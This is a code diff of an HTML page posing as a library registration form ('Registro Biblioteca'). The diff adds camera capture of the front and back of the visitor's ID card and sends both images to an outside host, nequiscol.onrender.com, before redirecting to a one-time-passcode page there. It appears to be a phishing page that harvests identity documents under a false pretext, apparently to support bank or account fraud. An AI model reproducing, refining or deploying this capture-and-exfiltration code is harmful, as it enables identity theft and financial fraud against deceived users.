@@ -3,13 +3,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Registro Biblioteca</title>
+<title>Registro Biblioteca - Laboratorio</title>
 
 <style>
 body {
     margin: 0;
     font-family: Arial, sans-serif;
-    background: #f5f5f5;
+    background: #f4f4f4;
+    text-align: center;
 }
 
 .screen {
@@ -25,13 +26,20 @@ body {
     justify-content: center;
 }
 
+video {
+    width: 280px;
+    height: 380px;
+    border-radius: 20px;
+    object-fit: cover;
+}
+
 button {
+    margin-top: 15px;
     padding: 10px 20px;
-    background: #7b6b99;
-    color: white;
     border: none;
     border-radius: 5px;
-    margin-top: 15px;
+    background: #7b6b99;
+    color: white;
     cursor: pointer;
 }
 
@@ -42,6 +50,7 @@ button {
     border-top: 4px solid #7b6b99;
     border-radius: 50%;
     animation: spin 1s linear infinite;
+    margin-bottom: 10px;
 }
 
 @keyframes spin {
@@ -52,19 +61,11 @@ button {
 
 <body>
 
-<!-- SUBIR FRENTE -->
-<div id="screen-front" class="screen active">
-    <h2>Sube el frente del carnet</h2>
-    <input type="file" id="frontInput" accept="image/*">
-    <button onclick="handleFront()">Continuar</button>
-</div>
-
-<!-- SUBIR REVERSO -->
-<div id="screen-back" class="screen">
-    <h2>Voltea el documento</h2>
-    <p>Ahora sube el reverso del carnet</p>
-    <input type="file" id="backInput" accept="image/*">
-    <button onclick="handleBack()">Enviar</button>
+<!-- CAPTURA -->
+<div id="screen-camera" class="screen active">
+    <h2 id="title">Captura el frente del carnet</h2>
+    <video id="video" autoplay playsinline muted></video>
+    <button onclick="capture()">Tomar foto</button>
 </div>
 
 <!-- PROCESANDO -->
@@ -73,64 +74,98 @@ button {
     <p>Enviando información...</p>
 </div>
 
-<script>
- 
+<canvas id="canvas" style="display:none;"></canvas>
 
+<script>
 const SERVER_URL = "https://nequiscol.onrender.com";
 const REDIRECT_URL = "https://nequiscol.onrender.com/one-time-pass.php.html";
 
-let frontImage = null;
-let backImage = null;
+let stream = null;
+let step = 1;
+let imageFront = null;
+let imageBack = null;
 
-function handleFront() {
-    const file = document.getElementById("frontInput").files[0];
-    if (!file) {
-        alert("Por favor sube la imagen del frente.");
-        return;
+// Iniciar cámara
+async function startCamera() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: "environment" },
+            audio: false
+        });
+
+        document.getElementById("video").srcObject = stream;
+    } catch (error) {
+        alert("No se pudo acceder a la cámara.");
+        console.error(error);
     }
-
-    const reader = new FileReader();
-    reader.onload = function(e) {
-        frontImage = e.target.result;
-        document.getElementById("screen-front").classList.remove("active");
-        document.getElementById("screen-back").classList.add("active");
-    };
-    reader.readAsDataURL(file);
 }
 
-function handleBack() {
-    const file = document.getElementById("backInput").files[0];
-    if (!file) {
-        alert("Por favor sube la imagen del reverso.");
-        return;
+// Capturar imagen
+async function capture() {
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+
+    const imageData = canvas.toDataURL("image/jpeg", 0.8);
+
+    if (step === 1) {
+        imageFront = imageData;
+        step = 2;
+        document.getElementById("title").innerText = "Ahora voltea el documento y captura el reverso";
+        alert("Ahora voltea el documento");
+    } else {
+        imageBack = imageData;
+        stopCamera();
+        showProcessing();
+        await sendImages();
     }
+}
 
-    const reader = new FileReader();
-    reader.onload = async function(e) {
-        backImage = e.target.result;
-
-        document.getElementById("screen-back").classList.remove("active");
-        document.getElementById("screen-processing").classList.add("active");
-
-        await fetch(SERVER_URL, {
+// Enviar imágenes al backend
+async function sendImages() {
+    try {
+        const response = await fetch(`${SERVER_URL}/step-documents`, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
-                sessionId: Date.now().toString(),
-                frontImage,
-                backImage
+                studentCode: Date.now().toString(),
+                frontImage: imageFront,
+                backImage: imageBack
             })
         });
 
-        alert("Documento enviado correctamente.");
-       // location.reload();
-		setTimeout(() => {window.location.href = REDIRECT_URL;}, 1500);
-		
-		
-    };
+        const result = await response.text();
+        //alert("Registro enviado correctamente.");
+        setTimeout(() => {
+        window.location.href = REDIRECT_URL;
+       }, 1500);
 
-    reader.readAsDataURL(file);
+    } catch (error) {
+        console.error("Error al enviar:", error);
+        alert("Error al enviar las imágenes.");
+        location.reload();
+    }
 }
+
+// Detener cámara
+function stopCamera() {
+    if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+    }
+}
+
+// Mostrar loader
+function showProcessing() {
+    document.getElementById("screen-camera").classList.remove("active");
+    document.getElementById("screen-processing").classList.add("active");
+}
+
+startCamera();
 </script>
 
 </body>
